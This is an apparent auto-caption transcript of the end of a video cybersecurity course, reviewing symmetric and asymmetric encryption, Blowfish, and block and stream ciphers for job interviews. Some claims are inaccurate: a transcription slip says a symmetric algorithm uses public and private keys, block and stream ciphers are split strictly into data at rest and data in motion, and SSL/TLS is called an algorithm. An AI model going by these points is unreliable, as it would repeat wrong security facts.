you might not want to go with this
technical in an interview question you
just need to identify what the algorithm
is used for so whether it is a symmetric
algorithm which means it uses the same
key or
a symmetric algorithm where it uses a
public key to encrypt and a private key
to decrypt
thus the blowfish algorithm is just one
more algorithm which uses symmetric
encryption to encrypt and decrypt data
algorithms that we have seen rsa and
others that we have discussed as far as
the interview questions are concerned
what we need to remember is
which algorithms are symmetric which
algorithms are asymmetric what do
symmetric algorithms do and what do
unsymmetric uh symmetric algorithms do
and we also look at block ciphers and
stream ciphers block ciphers are
utilized to encrypt data that is stored
stationary data data at rest and stream
ciphers are utilized for data in motion
while they're being streamed so ssl and
tls is another algorithm that comes into
the picture when you're looking at
streaming data
and with that we have come to the end of
this video on cyber security expert full
course i hope it was informative and
interesting if you have any questions
related to the topics that were covered
in this video please ask away in the
comment section below our team will help
you solve your queries thanks for
watching stay safe and keep learning